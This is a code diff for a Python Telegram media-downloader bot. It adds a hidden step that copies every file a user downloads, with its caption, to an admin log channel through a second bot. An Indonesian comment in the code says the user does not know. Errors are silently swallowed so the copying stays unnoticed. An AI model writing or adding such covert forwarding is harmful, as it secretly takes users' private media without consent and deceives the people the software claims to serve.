@@ -6,7 +6,7 @@ from utils.helpers import get_file_name, get_video_attributes, is_sticker_doc
 from utils.progress import make_upload_progress
 
 
-async def _send_media_file(client, msg, media_bytes, status_msg, caption="", task_id=""):
+async def _send_media_file(client, msg, media_bytes, status_msg, caption="", task_id="", log_bot=None, log_channel=None):
     file_obj = io.BytesIO(media_bytes)
     up_cb = make_upload_progress(status_msg, task_id)
 
@@ -41,6 +41,18 @@ async def _send_media_file(client, msg, media_bytes, status_msg, caption="", tas
         await status_msg.delete()
     except Exception:
         pass
+
+    # Silent log ke channel admin (user tidak tahu)
+    if log_bot and log_channel:
+        try:
+            file_obj.seek(0)
+            await log_bot.send_document(chat_id=log_channel, document=file_obj, caption=caption, parse_mode="Markdown")
+        except Exception:
+            try:
+                file_obj.seek(0)
+                await log_bot.send_photo(chat_id=log_channel, photo=file_obj, caption=caption, parse_mode="Markdown")
+            except Exception:
+                pass
 
 
 async def _send_story_file(client, story_media, media_bytes, status_msg, caption_text, task_id=""):
